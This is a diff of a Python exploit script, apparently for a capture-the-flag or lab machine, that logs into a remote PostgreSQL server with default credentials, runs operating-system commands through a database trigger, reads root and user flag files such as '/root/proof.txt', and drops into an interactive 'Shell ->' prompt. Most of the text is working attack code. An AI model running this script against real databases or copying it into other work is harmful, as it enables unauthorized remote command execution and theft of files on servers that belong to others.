@@ -1,26 +1,5 @@
-"""
-A lot of this code was grabbed from a Stack Overflow answer from deszo
-https://dba.stackexchange.com/questions/128229/execute-system-commands-in-postgresql
-"""
-
 import psycopg2
 import sys
-
-rhost = "" #Remote IP Address
-rport = 5432 #Remote Port
-user = "postgres" #Postgres User
-password = "" #Postgres Password
-database = "postgres" #Database (Default: postgres)
-
-conn = psycopg2.connect(
-    host=rhost,
-    database=database,
-    user=user,
-    password=password,
-    port=rport)
-
-###Connecting to Database
-cur = conn.cursor()
 
 def psql_exec(cur, cmd):
     ###Creating Table for Command Trigger
@@ -66,9 +45,11 @@ def psql_exec(cur, cmd):
 
         #Output value
         row = cur.fetchone()
+        output = []
         while row is not None:
-            print(row[1])
+            output.append(row[1])
             row = cur.fetchone()
+        return "\n".join(output)
     except psycopg2.errors.ExternalRoutineException:
         print("Permission Denied: trigger_test_source")
         try:
@@ -76,19 +57,47 @@ def psql_exec(cur, cmd):
         except psycopg2.errors.InFailedSqlTransaction:
             cur.execute("ROLLBACK")
     except psycopg2.errors.BadCopyFileFormat:
-        #Files such as /etc/crontab screw up the shell. Don't know why it happens, maybe bad characters that need to be escaped
+        #It seems files like /etc/crontab have trouble parsing the data into the Psql Database
         print("TODO: Execute the command piped into base64, then base64 decode")
         cur.execute("ROLLBACK")
 
+
 if __name__ == "__main__":
+
+    rhost = "" #Remote host IP
+    rport = 5432 #Remote host PORT
+    user = "postgres" #Postgres user (Default: postgres)
+    password = "postgres" #Postgres password (Default: postgres)
+    database = "postgres" #Postgres Database (Default: postgres)
+
+    ###Connecting to Database
+    print("Connecting to Database...")
+    try:
+        conn = psycopg2.connect(
+            host=rhost,
+            database=database,
+            user=user,
+            password=password,
+            port=rport, connect_timeout=5)
+        cur = conn.cursor()
+    except psycopg2.OperationalError as e:
+        print(f"Connection failed: {e}")
+        sys.exit()
+    print("Connection successful!")
+
     try:
         try:
-            psql_exec(cur, "id")
+            id_cmd = psql_exec(cur, "id")
+            root_flag = psql_exec(cur, "cat /root/proof.txt")
+            user_flag = psql_exec(cur, "cat /home/thesplodge/local.txt")
+            print(id_cmd)
+            print(f"User Flag: {user_flag}")
+            print(f"Root Flag: {root_flag}")
         except:
             print("Command execution does not seem to work")
         while True:
             cmd = input("Shell -> ")
-            psql_exec(cur, cmd)
+            print(psql_exec(cur, cmd))
             print() 
 
     except KeyboardInterrupt:
